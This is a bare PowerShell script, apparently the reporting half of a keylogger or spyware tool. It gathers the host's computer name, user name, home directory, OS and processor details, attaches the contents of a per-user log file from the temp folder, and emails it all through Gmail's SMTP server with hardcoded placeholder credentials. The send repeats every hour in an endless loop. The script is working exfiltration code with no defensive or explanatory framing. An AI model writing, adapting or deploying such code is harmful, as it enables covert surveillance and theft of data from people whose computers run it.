
$Email = "username@gmail.com"
$Password = "password"

function sendMail($logFile="$env:temp\$env:username.log") {
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
    if (Test-Path $logFile) {
        $Body += Get-Content -Path $logFile -Raw
    }
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
    $SMTPClient.Send($Email, $Email, $Subject, $Body)
}

function scheduleMail($MinutesInterval=60) {
        $now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
		$timeLeft = ($nextInterval - $now).TotalSeconds
	
        Start-Sleep -Seconds $timeLeft
        while ($true) {
            sendMail
            Start-Sleep -Seconds $SecondsInterval
        }
}

sendMail
scheduleMail -MinutesInterval 60